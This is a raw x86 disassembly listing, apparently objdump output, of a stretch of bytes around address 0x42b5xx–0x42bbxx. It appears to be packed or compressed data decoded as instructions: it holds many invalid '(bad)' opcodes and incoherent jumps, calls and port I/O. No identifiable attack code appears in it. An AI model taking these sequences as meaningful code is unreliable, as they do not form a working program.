  42b59f:	8a d0                	mov    %al,%dl
  42b5a1:	0d 62 6e cd 0d       	or     $0xdcd6e62,%eax
  42b5a6:	ff                   	(bad)
  42b5a7:	ff                   	(bad)
  42b5a8:	ff                   	(bad)
  42b5a9:	ff                   	(bad)
  42b5aa:	fe                   	(bad)
  42b5ab:	66 5c                	pop    %sp
  42b5ad:	e1 29                	loope  0x42b5d8
  42b5af:	1f                   	pop    %ds
  42b5b0:	ab                   	stos   %eax,%es:(%edi)
  42b5b1:	28 a9 4c 1b b5 53    	sub    %ch,0x53b51b4c(%ecx)
  42b5b7:	00 28                	add    %ch,(%eax)
  42b5b9:	d5 ed                	aad    $0xed
  42b5bb:	32 04 fc             	xor    (%esp,%edi,8),%al
  42b5be:	95                   	xchg   %eax,%ebp
  42b5bf:	70 1f                	jo     0x42b5e0
  42b5c1:	85 28                	test   %ebp,(%eax)
  42b5c3:	34 e1                	xor    $0xe1,%al
  42b5c5:	ed                   	in     (%dx),%eax
  42b5c6:	7c 8a                	jl     0x42b552
  42b5c8:	4d                   	dec    %ebp
  42b5c9:	ff                   	(bad)
  42b5ca:	ff                   	(bad)
  42b5cb:	ff                   	(bad)
  42b5cc:	ff 92 e1 d9 ed 0c    	call   *0xcedd9e1(%edx)
  42b5d2:	1f                   	pop    %ds
  42b5d3:	57                   	push   %edi
  42b5d4:	ea 39 6c b7 96 1d 48 	ljmp   $0x481d,$0x96b76c39
  42b5db:	15 19 3c 39 0d       	adc    $0xd393c19,%eax
  42b5e0:	9f                   	lahf
  42b5e1:	ce                   	into
  42b5e2:	db 95 31 3a de 11    	fistl  0x11de3a31(%ebp)
  42b5e8:	c2 a9 68             	ret    $0x68a9
  42b5eb:	ee                   	out    %al,(%dx)
  42b5ec:	13 bf b1 c5 ff 2f    	adc    0x2fffc5b1(%edi),%edi
  42b5f2:	15 d3 88 03 55       	adc    $0x550388d3,%eax
  42b5f7:	06                   	push   %es
  42b5f8:	e9 27 ff ca 9e       	jmp    0x9f0db524
  42b5fd:	f2 f5                	repnz cmc
  42b5ff:	89 68 28             	mov    %ebp,0x28(%eax)
  42b602:	c5 ff ff             	(bad)
  42b605:	ff                   	(bad)
  42b606:	ff                   	ljmp   (bad)
  42b607:	ed                   	in     (%dx),%eax
  42b608:	f5                   	cmc
  42b609:	02 f5                	add    %ch,%dh
  42b60b:	c7 c2 4b ca eb 10    	mov    $0x10ebca4b,%edx
  42b611:	95                   	xchg   %eax,%ebp
  42b612:	0a b2 c5 8b 1c 70    	or     0x701c8bc5(%edx),%dh
  42b618:	08 37                	or     %dh,(%edi)
  42b61a:	61                   	popa
  42b61b:	82 22 43             	andb   $0x43,(%edx)
  42b61e:	ed                   	in     (%dx),%eax
  42b61f:	9e                   	sahf
  42b620:	36 18 55 4b          	sbb    %dl,%ss:0x4b(%ebp)
  42b624:	37                   	aaa
  42b625:	85 49 ff             	test   %ecx,-0x1(%ecx)
  42b628:	ff                   	(bad)
  42b629:	ff                   	(bad)
  42b62a:	ff                   	(bad)
  42b62b:	78 6b                	js     0x42b698
  42b62d:	5a                   	pop    %edx
  42b62e:	fb                   	sti
  42b62f:	69 20 e1 c7 91 0c    	imul   $0xc91c7e1,(%eax),%esp
  42b635:	ff                   	ljmp   (bad)
  42b636:	e9 23 c9 b8 e9       	jmp    0xe9fb7f5e
  42b63b:	92                   	xchg   %eax,%edx
  42b63c:	b0 f5                	mov    $0xf5,%al
  42b63e:	0a 9f 50 aa 69 b7    	or     -0x489655b0(%edi),%bl
  42b644:	40                   	inc    %eax
  42b645:	1d eb 98 f8 f8       	sbb    $0xf8f898eb,%eax
  42b64a:	61                   	popa
  42b64b:	17                   	pop    %ss
  42b64c:	fa                   	cli
  42b64d:	4b                   	dec    %ebx
  42b64e:	ff 97 2c 3e 25 6b    	call   *0x6b253e2c(%edi)
  42b654:	d9 96 86 a3 c4 1f    	fsts   0x1fc4a386(%esi)
  42b65a:	ae                   	scas   %es:(%edi),%al
  42b65b:	ff 29                	ljmp   *(%ecx)
  42b65d:	58                   	pop    %eax
  42b65e:	3b 28                	cmp    (%eax),%ebp
  42b660:	ab                   	stos   %eax,%es:(%edi)
  42b661:	d2 ff                	sar    %cl,%bh
  42b663:	ff                   	(bad)
  42b664:	ff 10                	call   *(%eax)
  42b666:	cc                   	int3
  42b667:	ca c1 1b             	lret   $0x1bc1
  42b66a:	dc 35 55 ae 09 50    	fdivl  0x5009ae55
  42b670:	70 5d                	jo     0x42b6cf
  42b672:	0f d7 e5             	pmovmskb %mm5,%esp
  42b675:	db 0f                	fisttpl (%edi)
  42b677:	4a                   	dec    %edx
  42b678:	0e                   	push   %cs
  42b679:	40                   	inc    %eax
  42b67a:	70 49                	jo     0x42b6c5
  42b67c:	3d b3 35 00 ff       	cmp    $0xff0035b3,%eax
  42b681:	ff                   	(bad)
  42b682:	ff                   	(bad)
  42b683:	ff 46 e5             	incl   -0x1b(%esi)
  42b686:	a2 03 0c ed 15       	mov    %al,0x15ed0c03
  42b68b:	38 83 99 10 1d c9    	cmp    %al,-0x36e2ef67(%ebx)
  42b691:	1a 82 f2 69 f6 ec    	sbb    -0x1309960e(%edx),%al
  42b697:	0e                   	push   %cs
  42b698:	70 85                	jo     0x42b61f
  42b69a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42b69b:	e7 05                	out    %eax,$0x5
  42b69d:	14 e8                	adc    $0xe8,%al
  42b69f:	fd                   	std
  42b6a0:	7e c9                	jle    0x42b66b
  42b6a2:	0b ff                	or     %edi,%edi
  42b6a4:	ff                   	(bad)
  42b6a5:	ff d2                	call   *%edx
  42b6a7:	7e 37                	jle    0x42b6e0
  42b6a9:	db 70 52             	(bad) 0x52(%eax)
  42b6ac:	6b 55 67 8e          	imul   $0xffffff8e,0x67(%ebp),%edx
  42b6b0:	48                   	dec    %eax
  42b6b1:	b3 69                	mov    $0x69,%bl
  42b6b3:	0d 05 41 67 e9       	or     $0xe9674105,%eax
  42b6b8:	15 67 fe 87 79       	adc    $0x7987fe67,%eax
  42b6bd:	06                   	push   %es
  42b6be:	1a 21                	sbb    (%ecx),%ah
  42b6c0:	0e                   	push   %cs
  42b6c1:	5d                   	pop    %ebp
  42b6c2:	ff 25 fe 17 67 c2    	jmp    *0xc26717fe
  42b6c8:	3e bc 00 14 c1 8f    	ds mov $0x8fc11400,%esp
  42b6ce:	67 40                	addr16 inc %eax
  42b6d0:	5e                   	pop    %esi
  42b6d1:	a0 dd dc 25 31       	mov    0x3125dcdd,%al
  42b6d6:	19 ff                	sbb    %edi,%edi
  42b6d8:	ff 5f fa             	lcall  *-0x6(%edi)
  42b6db:	0e                   	push   %cs
  42b6dc:	f5                   	cmc
  42b6dd:	9c                   	pushf
  42b6de:	e9 e9 a2 21 2d       	jmp    0x2d6459cc
  42b6e3:	1a 1d d2 1b cb 77    	sbb    0x77cb1bd2,%bl
  42b6e9:	83 fa f5             	cmp    $0xfffffff5,%edx
  42b6ec:	fd                   	std
  42b6ed:	b2 f3                	mov    $0xf3,%dl
  42b6ef:	3c 29                	cmp    $0x29,%al
  42b6f1:	dc 0a                	fmull  (%edx)
  42b6f3:	b7 bd                	mov    $0xbd,%bh
  42b6f5:	db ff                	(bad)
  42b6f7:	ff                   	(bad)
  42b6f8:	ff 00                	incl   (%eax)
  42b6fa:	cb                   	lret
  42b6fb:	17                   	pop    %ss
  42b6fc:	9c                   	pushf
  42b6fd:	93                   	xchg   %eax,%ebx
  42b6fe:	e9 24 0a 45 fd       	jmp    0xfd87c127
  42b703:	83 00 94             	addl   $0xffffff94,(%eax)
  42b706:	20 cd                	and    %cl,%ch
  42b708:	64 96                	fs xchg %eax,%esi
  42b70a:	19 76 f9             	sbb    %esi,-0x7(%esi)
  42b70d:	17                   	pop    %ss
  42b70e:	65 82 40 0b 7c       	addb   $0x7c,%gs:0xb(%eax)
  42b713:	f5                   	cmc
  42b714:	48                   	dec    %eax
  42b715:	ff                   	(bad)
  42b716:	ff                   	(bad)
  42b717:	ff                   	(bad)
  42b718:	ff 08                	decl   (%eax)
  42b71a:	ca 24 82             	lret   $0x8224
  42b71d:	f9                   	stc
  42b71e:	09 94 37 44 05 28 61 	or     %edx,0x61280544(%edi,%esi,1)
  42b725:	75 97                	jne    0x42b6be
  42b727:	eb 44                	jmp    0x42b76d
  42b729:	01 86 34 fc f2 28    	add    %eax,0x28f2fc34(%esi)
  42b72f:	9b                   	fwait
  42b730:	79 e2                	jns    0x42b714
  42b732:	dc 2d e3 0a 00 db    	fsubrl 0xdb000ae3
  42b738:	29 ff                	sub    %edi,%edi
  42b73a:	ff                   	(bad)
  42b73b:	ff                   	(bad)
  42b73c:	ff                   	(bad)
  42b73d:	fb                   	sti
  42b73e:	01 0e                	add    %ecx,(%esi)
  42b740:	88 21                	mov    %ah,(%ecx)
  42b742:	75 26                	jne    0x42b76a
  42b744:	89 66 6f             	mov    %esp,0x6f(%esi)
  42b747:	c0 81 d8 be 03 1a 37 	rolb   $0x37,0x1a03bed8(%ecx)
  42b74e:	f1                   	int1
  42b74f:	fa                   	cli
  42b750:	30 25 15 6f f9 ab    	xor    %ah,0xabf96f15
  42b756:	c6                   	(bad)
  42b757:	9d                   	popf
  42b758:	d4 0b                	aam    $0xb
  42b75a:	11 1d a6 ff 0b fd    	adc    %ebx,0xfd0bffa6
  42b760:	ff 81 fb 5a 29 e1    	incl   -0x1ed6a505(%ecx)
  42b766:	61                   	popa
  42b767:	28 2b                	sub    %ch,(%ebx)
  42b769:	c5 d1 c7             	(bad)
  42b76c:	8e 38                	mov    (%eax),%?
  42b76e:	dc 11                	fcoml  (%ecx)
  42b770:	ad                   	lods   %ds:(%esi),%eax
  42b771:	31 ed                	xor    %ebp,%ebp
  42b773:	01 f8                	add    %edi,%eax
  42b775:	89 4d c7             	mov    %ecx,-0x39(%ebp)
  42b778:	5b                   	pop    %ebx
  42b779:	ff                   	(bad)
  42b77a:	ff                   	(bad)
  42b77b:	ff                   	(bad)
  42b77c:	ff c2                	inc    %edx
  42b77e:	06                   	push   %es
  42b77f:	ed                   	in     (%dx),%eax
  42b780:	8d 5e 58             	lea    0x58(%esi),%ebx
  42b783:	2d 7e 60 be 61       	sub    $0x61be607e,%eax
  42b788:	e1 f9                	loope  0x42b783
  42b78a:	01 25 07 19 dd 06    	add    %esp,0x6dd1907
  42b790:	9c                   	pushf
  42b791:	b7 1d                	mov    $0x1d,%bh
  42b793:	81 91 35 dd 33 6a c2 	adcl   $0x5c5f15c2,0x6a33dd35(%ecx)
  42b79a:	15 5f 5c 
  42b79d:	ff b7 7e e9 39 fa    	push   -0x5c61682(%edi)
  42b7a3:	35 4e 60 96 da       	xor    $0xda96604e,%eax
  42b7a8:	75 01                	jne    0x42b7ab
  42b7aa:	97                   	xchg   %eax,%edi
  42b7ab:	f9                   	stc
  42b7ac:	51                   	push   %ecx
  42b7ad:	19 43 8b             	sbb    %eax,-0x75(%ebx)
  42b7b0:	81 ca 76 fa 19 ff    	or     $0xff19fa76,%edx
  42b7b6:	ff d6                	call   *%esi
  42b7b8:	ff 58 08             	lcall  *0x8(%eax)
  42b7bb:	e9 05 ca 0c 9c       	jmp    0x9c4f81c5
  42b7c0:	47                   	inc    %edi
  42b7c1:	85 cd                	test   %ecx,%ebp
  42b7c3:	48                   	dec    %eax
  42b7c4:	80 45 1b 21          	addb   $0x21,0x1b(%ebp)
  42b7c8:	64 fe                	fs (bad)
  42b7ca:	77 90                	ja     0x42b75c
  42b7cc:	d9 b5 05 0d 08 15    	fnstenv 0x15080d05(%ebp)
  42b7d2:	35 ff ff ff c2       	xor    $0xc2ffffff,%eax
  42b7d7:	e5 9d                	in     $0x9d,%eax
  42b7d9:	37                   	aaa
  42b7da:	b5 02                	mov    $0x2,%ch
  42b7dc:	37                   	aaa
  42b7dd:	e1 33                	loope  0x42b812
  42b7df:	81 19 05 1a 87 44    	sbbl   $0x44871a05,(%ecx)
  42b7e5:	4d                   	dec    %ebp
  42b7e6:	0a 56 12             	or     0x12(%esi),%dl
  42b7e9:	ca ff 81             	lret   $0x81ff
  42b7ec:	88 08                	mov    %cl,(%eax)
  42b7ee:	21 6c 9f 4d          	and    %ebp,0x4d(%edi,%ebx,4)
  42b7f2:	ff                   	(bad)
  42b7f3:	ff                   	(bad)
  42b7f4:	ff 19                	lcall  *(%ecx)
  42b7f6:	c6                   	(bad)
  42b7f7:	bf b6 98 c4 6f       	mov    $0x6fc498b6,%edi
  42b7fc:	23 71 12             	and    0x12(%ecx),%esi
  42b7ff:	09 0b                	or     %ecx,(%ebx)
  42b801:	30 e8                	xor    %ch,%al
  42b803:	dd 9e 03 81 5d 49    	fstpl  0x495d8103(%esi)
  42b809:	ce                   	into
  42b80a:	6f                   	outsl  %ds:(%esi),(%dx)
  42b80b:	06                   	push   %es
  42b80c:	1e                   	push   %ds
  42b80d:	12 96 ff ff ff ff    	adc    -0x1(%esi),%dl
  42b813:	a8 34                	test   $0x34,%al
  42b815:	cd 2a                	int    $0x2a
  42b817:	d1 09                	rorl   $1,(%ecx)
  42b819:	60                   	pusha
  42b81a:	d8 01                	fadds  (%ecx)
  42b81c:	19 09                	sbb    %ecx,(%ecx)
  42b81e:	e3 1b                	jecxz  0x42b83b
  42b820:	ae                   	scas   %es:(%edi),%al
  42b821:	45                   	inc    %ebp
  42b822:	47                   	inc    %edi
  42b823:	19 ee                	sbb    %ebp,%esi
  42b825:	db 84 83 c3 0d 1d 58 	fildl  0x581d0dc3(%ebx,%eax,4)
  42b82c:	1c 15                	sbb    $0x15,%al
  42b82e:	1f                   	pop    %ds
  42b82f:	0b 8c 22 fe ff ff ff 	or     -0x2(%edx,%eiz,1),%ecx
  42b836:	ff 4d e6             	decl   -0x1a(%ebp)
  42b839:	26 11 ee             	es adc %ebp,%esi
  42b83c:	0c 01                	or     $0x1,%al
  42b83e:	15 9c b4 ea 14       	adc    $0x14eab49c,%eax
  42b843:	d3 86 e9 09 40 15    	roll   %cl,0x154009e9(%esi)
  42b849:	44                   	inc    %esp
  42b84a:	2d 18 f3 19 f7       	sub    $0xf719f318,%eax
  42b84f:	08 19                	or     %bl,(%ecx)
  42b851:	f1                   	int1
  42b852:	2d 34 21 4a 25       	sub    $0x254a2134,%eax
  42b857:	ff                   	(bad)
  42b858:	ff                   	(bad)
  42b859:	ff                   	(bad)
  42b85a:	ff 49 a5             	decl   -0x5b(%ecx)
  42b85d:	82 6c cb 25 c3       	subb   $0xc3,0x25(%ebx,%ecx,8)
  42b862:	00 18                	add    %bl,(%eax)
  42b864:	ee                   	out    %al,(%dx)
  42b865:	bb 0a b1 6d c2       	mov    $0xc26db10a,%ebx
  42b86a:	03 cc                	add    %esp,%ecx
  42b86c:	70 02                	jo     0x42b870
  42b86e:	15 c8 c6 24 5a       	adc    $0x5a24c6c8,%eax
  42b873:	07                   	pop    %es
  42b874:	e4 35                	in     $0x35,%al
  42b876:	d4 59                	aam    $0x59
  42b878:	35 66 2e 6e fc       	xor    $0xfc6e2e66,%eax
  42b87d:	ff f6                	push   %esi
  42b87f:	66 37                	data16 aaa
  42b881:	01 b8 07 3d 9a ce    	add    %edi,-0x3165c2f9(%eax)
  42b887:	94                   	xchg   %eax,%esp
  42b888:	dd 35 dc 4e 79 35    	fnsave 0x35794edc
  42b88e:	d8 64 cc 3e          	fsubs  0x3e(%esp,%ecx,8)
  42b892:	b2 59                	mov    $0x59,%dl
  42b894:	ff                   	(bad)
  42b895:	7f fb                	jg     0x42b892
  42b897:	97                   	xchg   %eax,%edi
  42b898:	dc 8b a8 89 dc 2e    	fmull  0x2edc89a8(%ebx)
  42b89e:	09 bc b0 c3 fc 30 42 	or     %edi,0x4230fcc3(%eax,%esi,4)
  42b8a5:	37                   	aaa
  42b8a6:	e0 89                	loopne 0x42b831
  42b8a8:	59                   	pop    %ecx
  42b8a9:	37                   	aaa
  42b8aa:	ec                   	in     (%dx),%al
  42b8ab:	03 61 47             	add    0x47(%ecx),%esp
  42b8ae:	bb ff ff c2 ff       	mov    $0xffc2ffff,%ebx
  42b8b3:	00 bc 45 15 26 c2 53 	add    %bh,0x53c22615(%ebp,%eax,2)
  42b8ba:	d7                   	xlat   %ds:(%ebx)
  42b8bb:	f6 59 33             	negb   0x33(%ecx)
  42b8be:	2b 84 71 3b 92 c4 4f 	sub    0x4fc4923b(%ecx,%esi,2),%eax
  42b8c5:	fc                   	cld
  42b8c6:	2b c0                	sub    %eax,%eax
  42b8c8:	f3 c7                	repz (bad)
  42b8ca:	14 33                	adc    $0x33,%al
  42b8cc:	6e                   	outsb  %ds:(%esi),(%dx)
  42b8cd:	17                   	pop    %ss
  42b8ce:	f8                   	clc
  42b8cf:	ff 52 5c             	call   *0x5c(%edx)
  42b8d2:	0d 27 5e 25 b8       	or     $0xb8255e27,%eax
  42b8d7:	14 1d                	adc    $0x1d,%al
  42b8d9:	62 f2 d1             	(bad) {%k4}
  42b8dc:	24 c5                	and    $0xc5,%al
  42b8de:	46                   	inc    %esi
  42b8df:	09 d4                	or     %edx,%esp
  42b8e1:	fc                   	cld
  42b8e2:	c2 97 fa             	ret    $0xfa97
  42b8e5:	d5 72                	aad    $0x72
  42b8e7:	82 e7 24             	and    $0x24,%bh
  42b8ea:	e8 71 07 ee 1b       	call   0x1c30c060
  42b8ef:	6a b5                	push   $0xffffffb5
  42b8f1:	ec                   	in     (%dx),%al
  42b8f2:	eb ff                	jmp    0x42b8f3
  42b8f4:	83 ff ff             	cmp    $0xffffffff,%edi
  42b8f7:	ff 0b                	decl   (%ebx)
  42b8f9:	61                   	popa
  42b8fa:	f9                   	stc
  42b8fb:	ed                   	in     (%dx),%eax
  42b8fc:	8a f8                	mov    %al,%bh
  42b8fe:	01 ca                	add    %ecx,%edx
  42b900:	ee                   	out    %al,(%dx)
  42b901:	00 d4                	add    %dl,%ah
  42b903:	7d e0                	jge    0x42b8e5
  42b905:	2d 5d c6 3d ab       	sub    $0xab3dc65d,%eax
  42b90a:	e9 cd 5d b6 54       	jmp    0x54f916dc
  42b90f:	20 59 00             	and    %bl,0x0(%ecx)
  42b912:	61                   	popa
  42b913:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42b914:	8d                   	lea    (bad),%edi
  42b915:	ff                   	(bad)
  42b916:	ff 6d c9             	ljmp   *-0x37(%ebp)
  42b919:	05 ea ea 6d 02       	add    $0x26deaea,%eax
  42b91e:	54                   	push   %esp
  42b91f:	38 14 28             	cmp    %dl,(%eax,%ebp,1)
  42b922:	49                   	dec    %ecx
  42b923:	21 0d 77 11 84 50    	and    %ecx,0x50841177
  42b929:	7f 28                	jg     0x42b953
  42b92b:	ff 5f e0             	lcall  *-0x20(%edi)
  42b92e:	ff                   	(bad)
  42b92f:	ba 28 01 80 04       	mov    $0x4800128,%edx
  42b934:	12 76 e9             	adc    -0x17(%esi),%dh
  42b937:	2e cd 8e             	cs int $0x8e
  42b93a:	06                   	push   %es
  42b93b:	8e e4                	mov    %esp,%fs
  42b93d:	8e a0 67 2a 51 51    	mov    0x51512a67(%eax),%fs
  42b943:	21 55 c6             	and    %edx,-0x3a(%ebp)
  42b946:	c9                   	leave
  42b947:	5b                   	pop    %ebx
  42b948:	ff                   	(bad)
  42b949:	ff                   	(bad)
  42b94a:	ff 44 23 f2          	incl   -0xe(%ebx,%eiz,1)
  42b94e:	1e                   	push   %ds
  42b94f:	73 b1                	jae    0x42b902
  42b951:	41                   	inc    %ecx
  42b952:	2a bb 0b 3c 21 36    	sub    0x36213c0b(%ebx),%bh
  42b958:	35 7b 2b fa 08       	xor    $0x8fa2b7b,%eax
  42b95d:	02 ba 5e 86 d8 8e    	add    -0x712779a2(%edx),%bh
  42b963:	ee                   	out    %al,(%dx)
  42b964:	35 ff ff ff ff       	xor    $0xffffffff,%eax
  42b969:	bc 2b 0c 8c 15       	mov    $0x158c0c2b,%esp
  42b96e:	31 70 71             	xor    %esi,0x71(%eax)
  42b971:	b2 46                	mov    $0x46,%dl
  42b973:	ed                   	in     (%dx),%eax
  42b974:	3a 6d 85             	cmp    -0x7b(%ebp),%ch
  42b977:	64 31 2a             	xor    %ebp,%fs:(%edx)
  42b97a:	5c                   	pop    %esp
  42b97b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42b97c:	11 39                	adc    %edi,(%ecx)
  42b97e:	c4 5e ef             	les    -0x11(%esi),%ebx
  42b981:	06                   	push   %es
  42b982:	4e                   	dec    %esi
  42b983:	63 86 28 a4 08 b8    	arpl   %eax,-0x47f75bd8(%esi)
  42b989:	ff                   	(bad)
  42b98a:	ff                   	(bad)
  42b98b:	ff                   	(bad)
  42b98c:	ff 47 da             	incl   -0x26(%edi)
  42b98f:	f2 0b a1 01 a5 19 3d 	repnz or 0x3d19a501(%ecx),%esp
  42b996:	ae                   	scas   %es:(%edi),%al
  42b997:	2a 15 ee bf 8f 50    	sub    0x508fbfee,%dl
  42b99d:	4e                   	dec    %esi
  42b99e:	38 66 3c             	cmp    %ah,0x3c(%esi)
  42b9a1:	23 fa                	and    %edx,%edi
  42b9a3:	7a f2                	jp     0x42b997
  42b9a5:	1f                   	pop    %ds
  42b9a6:	84 5b 24             	test   %bl,0x24(%ebx)
  42b9a9:	53                   	push   %ebx
  42b9aa:	88 74 f9 ff          	mov    %dh,-0x1(%ecx,%edi,8)
  42b9ae:	bf c0 ff 3e f5       	mov    $0xf53effc0,%edi
  42b9b3:	77 17                	ja     0x42b9cc
  42b9b5:	8e 0b                	mov    (%ebx),%cs
  42b9b7:	80 cc 71             	or     $0x71,%ah
  42b9ba:	02 60 16             	add    0x16(%eax),%ah
  42b9bd:	ff b4 d4 1b 86 eb 01 	push   0x1eb861b(%esp,%edx,8)
  42b9c4:	ee                   	out    %al,(%dx)
  42b9c5:	ef                   	out    %eax,(%dx)
  42b9c6:	fd                   	std
  42b9c7:	0e                   	push   %cs
  42b9c8:	20 06                	and    %al,(%esi)
  42b9ca:	ff                   	(bad)
  42b9cb:	ff                   	(bad)
  42b9cc:	ff                   	(bad)
  42b9cd:	7b 97                	jnp    0x42b966
  42b9cf:	5e                   	pop    %esi
  42b9d0:	e5 14                	in     $0x14,%eax
  42b9d2:	ed                   	in     (%dx),%eax
  42b9d3:	5b                   	pop    %ebx
  42b9d4:	fa                   	cli
  42b9d5:	a8 56                	test   $0x56,%al
  42b9d7:	8e 58 0d             	mov    0xd(%eax),%ds
  42b9da:	fa                   	cli
  42b9db:	20 4f a0             	and    %cl,-0x60(%edi)
  42b9de:	ea c2 5f 78 15 80 f3 	ljmp   $0xf380,$0x15785fc2
  42b9e5:	91                   	xchg   %eax,%ecx
  42b9e6:	ff 6f f1             	ljmp   *-0xf(%edi)
  42b9e9:	ff 86 38 b2 80 92    	incl   -0x6d7f4dc8(%esi)
  42b9ef:	7f 5a                	jg     0x42ba4b
  42b9f1:	a8 23                	test   $0x23,%al
  42b9f3:	86 fb                	xchg   %bh,%bl
  42b9f5:	67 01 07             	add    %eax,(%bx)
  42b9f8:	70 ec                	jo     0x42b9e6
  42b9fa:	bb 06 bb 27 40       	mov    $0x4027bb06,%ebx
  42b9ff:	45                   	inc    %ebp
  42ba00:	e3 ff                	jecxz  0x42ba01
  42ba02:	ff                   	(bad)
  42ba03:	ff                   	(bad)
  42ba04:	ff 52 53             	call   *0x53(%edx)
  42ba07:	56                   	push   %esi
  42ba08:	fa                   	cli
  42ba09:	d5 0d                	aad    $0xd
  42ba0b:	09 fc                	or     %edi,%esp
  42ba0d:	78 cb                	js     0x42b9da
  42ba0f:	b5 ed                	mov    $0xed,%ch
  42ba11:	10 40 87             	adc    %al,-0x79(%eax)
  42ba14:	b5 4b                	mov    $0x4b,%ch
  42ba16:	0a 71 fb             	or     -0x5(%ecx),%dh
  42ba19:	73 d2                	jae    0x42b9ed
  42ba1b:	13 59 36             	adc    0x36(%ecx),%ebx
  42ba1e:	82 09 49             	orb    $0x49,(%ecx)
  42ba21:	12 32                	adc    (%edx),%dh
  42ba23:	52                   	push   %edx
  42ba24:	55                   	push   %ebp
  42ba25:	ff                   	(bad)
  42ba26:	ff                   	(bad)
  42ba27:	ff                   	(bad)
  42ba28:	ff 16                	call   *(%esi)
  42ba2a:	e1 f2                	loope  0x42ba1e
  42ba2c:	d2 c9                	ror    %cl,%cl
  42ba2e:	f4                   	hlt
  42ba2f:	51                   	push   %ecx
  42ba30:	43                   	inc    %ebx
  42ba31:	06                   	push   %es
  42ba32:	70 23                	jo     0x42ba57
  42ba34:	31 e5                	xor    %esp,%ebp
  42ba36:	fb                   	sti
  42ba37:	c6                   	(bad)
  42ba38:	93                   	xchg   %eax,%ebx
  42ba39:	80 73 06 24          	xorb   $0x24,0x6(%ebx)
  42ba3d:	20 a8 09 14 5e 0d    	and    %ch,0xd5e1409(%eax)
  42ba43:	6a 75                	push   $0x75
  42ba45:	94                   	xchg   %eax,%esp
  42ba46:	0d 39 cf 7c 89       	or     $0x897ccf39,%eax
  42ba4b:	ff c6                	inc    %esi
  42ba4d:	5a                   	pop    %edx
  42ba4e:	5b                   	pop    %ebx
  42ba4f:	84 9e b5 87 84 75    	test   %bl,0x758487b5(%esi)
  42ba55:	3d 8a 9a 36 a4       	cmp    $0xa4369a8a,%eax
  42ba5a:	2d 0c fb f1 0b       	sub    $0xbf1fb0c,%eax
  42ba5f:	14 6e                	adc    $0x6e,%al
  42ba61:	64 00 89 82 c6 69 76 	add    %cl,%fs:0x7669c682(%ecx)
  42ba68:	71 77                	jno    0x42bae1
  42ba6a:	69 ff 12 1b 2f 3c    	imul   $0x3c2f1b12,%edi,%edi
  42ba70:	44                   	inc    %esp
  42ba71:	fa                   	cli
  42ba72:	ea c2 42 50 51 60 68 	ljmp   $0x6860,$0x515042c2
  42ba79:	75 55                	jne    0x42bad0
  42ba7b:	64 71 e2             	fs jno 0x42ba60
  42ba7e:	97                   	xchg   %eax,%edi
  42ba7f:	f8                   	clc
  42ba80:	ff 6d 08             	ljmp   *0x8(%ebp)
  42ba83:	52                   	push   %edx
  42ba84:	77 6c                	ja     0x42baf2
  42ba86:	71 60                	jno    0x42bae8
  42ba88:	55                   	push   %ebp
  42ba89:	77 6a                	ja     0x42baf5
  42ba8b:	66 60                	pushaw
  42ba8d:	76 13                	jbe    0x42baa2
  42ba8f:	d9 b3 b2 48 13 13    	fnstenv 0x131348b2(%ebx)
  42ba95:	ff                   	(bad)
  42ba96:	ff 5f ae             	lcall  *-0x52(%edi)
  42ba99:	7c 16                	jl     0x42bab1
  42ba9b:	56                   	push   %esi
  42ba9c:	2d 60 75 46 69       	sub    $0x69467560,%eax
  42baa1:	6a 76                	push   $0x76
  42baa3:	60                   	pusha
  42baa4:	70 6a                	jo     0x42bb10
  42baa6:	be f3 4d 64 6b       	mov    $0x6b644df3,%esi
  42baab:	61                   	popa
  42baac:	0b 81 5f fa 5f 78    	or     0x785ffa5f(%ecx),%eax
  42bab2:	35 60 51 6d d3       	xor    $0xd36d5160,%eax
  42bab7:	1b b3 d8 8b 46 49    	sbb    0x49468bd8(%ebx),%esi
  42babd:	64 54                	fs push %esp
  42babf:	40                   	inc    %eax
  42bac0:	87 77 1e             	xchg   %esi,0x1e(%edi)
  42bac3:	48                   	dec    %eax
  42bac4:	70 fd                	jo     0x42bac3
  42bac6:	ff                   	(bad)
  42bac7:	ff 12                	call   *(%edx)
  42bac9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42baca:	ab                   	stos   %eax,%es:(%edi)
  42bacb:	de 06                	fiadds (%esi)
  42bacd:	7d 54                	jge    0x42bb23
  42bacf:	57                   	push   %edi
  42bad0:	24 55                	and    $0x55,%al
  42bad2:	2b dd                	sub    %ebp,%ebx
  42bad4:	8a bc 7a 14 44 61 61 	mov    0x61614414(%edx,%edi,2),%bh
  42badb:	77 10                	ja     0x42baed
  42badd:	0a 48 ff             	or     -0x1(%eax),%cl
  42bae0:	ff                   	(bad)
  42bae1:	ff 6f 69             	ljmp   *0x69(%edi)
  42bae4:	70 69                	jo     0x42bb4f
  42bae6:	58                   	pop    %eax
  42bae7:	be 38 c8 33 44       	mov    $0x4433c838,%esi
  42baec:	a2 9c 35 5a 39       	mov    %al,0x395a359c
  42baf1:	6f                   	outsl  %ds:(%esi),(%dx)
  42baf2:	70 5c                	jo     0x42bb50
  42baf4:	95                   	xchg   %eax,%ebp
  42baf5:	de 5b 7b             	ficomps 0x7b(%ebx)
  42baf8:	5a                   	pop    %edx
  42baf9:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  42bafc:	73 68                	jae    0x42bb66
  42bafe:	64 ff                	fs (bad)
  42bb00:	7f a1                	jg     0x42baa3
  42bb02:	ff 69 81             	ljmp   *-0x7f(%ecx)
  42bb05:	66 10 59 5e          	data16 adc %bl,0x5e(%ecx)
  42bb09:	6b 4e af e3          	imul   $0xffffffe3,-0x51(%esi),%ecx
  42bb0d:	77 68                	ja     0x42bb77
  42bb0f:	63 47 8b             	arpl   %eax,-0x75(%edi)
  42bb12:	58                   	pop    %eax
  42bb13:	f2 5d                	repnz pop %ebp
  42bb15:	ee                   	out    %al,(%dx)
  42bb16:	c8 66 c6 02          	enter  $0xc666,$0x2
  42bb1a:	6b f6 f6             	imul   $0xfffffff6,%esi,%esi
  42bb1d:	ff                   	(bad)
  42bb1e:	ff 66 75             	jmp    *0x75(%esi)
  42bb21:	67 5a                	addr16 pop %edx
  42bb23:	14 61                	adc    $0x61,%al
  42bb25:	bf d2 b0 96 70       	mov    $0x7096b0d2,%edi
  42bb2a:	66 a0 22 66 bb 02    	data16 mov 0x2bb6622,%al
  42bb30:	75 6e                	jne    0x42bba0
  42bb32:	b6 fe                	mov    $0xfe,%dh
  42bb34:	92                   	xchg   %eax,%edx
